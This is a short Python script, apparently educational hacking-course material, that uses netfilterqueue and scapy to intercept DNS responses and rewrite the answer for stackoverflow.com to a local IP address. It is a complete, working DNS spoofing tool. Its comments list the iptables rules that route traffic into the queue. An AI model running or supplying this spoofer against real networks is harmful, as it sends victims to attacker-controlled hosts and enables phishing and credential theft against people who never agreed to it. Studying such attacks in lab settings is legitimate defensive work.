#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):  # Check if packet contains a (DNSRR) DNS response,
        # (DNSQR) stands for DNS request
        qname = scapy_packet[scapy.DNSQR].qname
        if "stackoverflow.com" in str(qname):
            print(f"[+] Spoofing {qname}")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.16")
            # Modifying a field with our custom answer
            scapy_packet[scapy.DNS].an = answer
            # Modifying the count of a field
            scapy_packet[scapy.DNS].ancount = 1

            # deleting some field which might corrupt our custom packet, such as len and chksum in IP and UDP layers,
            # They will be recalculated by scapy automatically
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # Modifying packet with our modified scapy_packet
            packet.set_payload(bytes(scapy_packet))

    packet.accept()  # To let the packet move forward to its destination


queue = netfilterqueue.NetfilterQueue()  # Creating an instance of NetfilterQueue() class
queue.bind(0, process_packet)  # 0 is the queue number of the queue we have created using this command in terminal:
# Instead FORWARD when testing on our own computer rather than remote computer we use INPUT and OUTPUT queue
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# And process_packet is a callback function which will be executed on all the packets +nt in the queue
queue.run()
